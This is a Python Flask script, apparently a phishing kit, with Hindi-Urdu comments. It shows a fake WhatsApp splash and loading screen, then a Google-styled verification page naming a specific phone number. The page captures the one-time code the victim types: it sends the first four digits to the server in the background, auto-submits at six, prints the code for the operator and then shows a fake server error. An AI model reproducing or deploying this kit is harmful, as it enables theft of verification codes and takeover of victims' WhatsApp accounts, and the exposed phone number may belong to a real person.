from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- HTML Templates as Strings ---

# Splash Page (Timing fast kar di gayi hai)
la1 = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: white; }
        img { width: 100%; height: auto; object-fit: cover; }
    </style>
    <script>
        setTimeout(function(){ window.location.href = "/loading"; }, 1500); // 1.5 seconds splash
    </script>
</head>
<body>
    <img src="https://i.postimg.cc/1zzFZdjB/IMG-20260406-WA0000.jpg" alt="WhatsApp Splash">
</body>
</html>
"""

la2 = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #666; }
        img { width: 100%; height: auto; object-fit: cover; }
    </style>
    <script>
        setTimeout(function(){ window.location.href = "/login"; }, 2000); // 2 seconds loading
    </script>
</head>
<body>
    <img src="https://i.postimg.cc/cH6m1Crr/Screenshot-20260406-212455-Google.jpg" alt="Loading">
</body>
</html>
"""

la3 = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Number</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
        body { font-family: 'Roboto', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; background-color: #ffffff; color: #3c4043; }
        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        .top-bar { display: flex; justify-content: space-between; margin-bottom: 40px; padding-top: 10px;}
        .icon-close { font-size: 24px; color: #5f6368; }
        .icon-help { width: 22px; height: 22px; border: 2px solid #5f6368; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; color: #5f6368; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        .info-text { font-size: 14px; color: #5f6368; margin-bottom: 30px; }
        .wrong-number { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .otp-container { display: inline-block; border-bottom: 2px solid #bdc1c6; margin-bottom: 50px; position: relative; }
        .otp-input { letter-spacing: 12px; font-size: 32px; border: none; outline: none; width: 180px; text-align: center; background: transparent; color: #202124; }
        .cursor { position: absolute; left: 8px; top: 5px; height: 35px; width: 2px; background-color: #00a86b; }
        .resend-link { display: block; color: #00875f; text-decoration: none; font-size: 14px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <div class="top-bar"><div class="icon-close">✕</div><div class="icon-help">?</div></div>
        <h1>Verifying your number</h1>
        <p class="info-text">SMS sent to +92304 3011605. <a href="#" class="wrong-number">Wrong number?</a></p>
        
        <form id="otpForm" method="POST">
            <div class="otp-container">
                <div class="cursor" id="customCursor"></div>
                <input type="number" class="otp-input" placeholder="--- ---" id="otpInput" name="otp" oninput="handleInput(this)" maxlength="6" autofocus>
            </div>
        </form>
        
        <a href="#" class="resend-link">Didn't receive code?</a>
    </div>

    <script>
        function handleInput(el) {
            const cursor = document.getElementById('customCursor');
            const val = el.value;
            
            // Cursor hide/show
            cursor.style.display = val.length > 0 ? 'none' : 'block';

            // 1. 4 Digit hote hi terminal mein bhejo (Background Fetch)
            if (val.length === 4) {
                fetch('/log_partial', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({otp: val, status: 'partial'})
                });
            }

            // 2. 6 Digit hote hi Auto-Submit
            if (val.length === 6) {
                document.getElementById('otpForm').submit();
            }
            
            // Max length check for number input
            if (val.length > 6) el.value = val.slice(0, 6);
        }
    </script>
</body>
</html>
"""

# --- Routes ---

@app.route('/')
def splash():
    return render_template_string(la1)

@app.route('/loading')
def loading():
    return render_template_string(la2)

# Partial data log karne ke liye endpoint (4 digit par trigger hoga)
@app.route('/log_partial', methods=['POST'])
def log_partial():
    data = request.get_json()
    print(f"[PARTIAL DATA] User is typing... Current OTP: {data['otp']}")
    return jsonify({"status": "success"})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        OT = request.form.get('otp')
        print(f"\n******************************")
        print(f" FINAL RECEIVED OTP: {OT} ")
        print(f"******************************\n")
        return "<h1>Server Can't Response!</h1>"
    
    return render_template_string(la3)

if __name__ == '__main__':
    # host='0.0.0.0' taaki aap phone se bhi access kar sakein
    app.run(debug=True, host='0.0.0.0', port=5000)
